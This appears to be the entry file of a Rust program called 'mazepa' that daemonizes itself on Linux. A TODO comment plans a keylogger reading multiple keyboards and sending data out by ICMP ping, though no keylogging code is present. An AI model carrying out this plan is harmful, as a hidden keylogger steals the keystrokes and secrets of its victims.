
extern crate daemonize;

use std::fmt::Result;

#[cfg(debug_assertions)]
use std::fs::File;

use cfg::Config;
use daemonize::Daemonize;
mod cfg;

fn main() -> Result {

    let cfg = Config::new();

    #[cfg(target_os = "linux")]
    if cfg.daemon_enabled {

        #[cfg(debug_assertions)]
        let stdout = File::create("/tmp/mazepa.out").unwrap();
        let stderr = File::create("/tmp/mazepa.err").unwrap();

        #[cfg(debug_assertions)]
        let deamon = Daemonize::new()
            .stdout(stdout)
            .stderr(stderr);

        #[cfg(not(debug_assertions))]
        let deamon = Daemonize::new();

        deamon.start().unwrap();
    }

    /*
        TODO:

        - load keylogger instance
            -> read from multiple keyboards (& manage locales)
            -> send ICMP ping
    */

    Ok(())
}
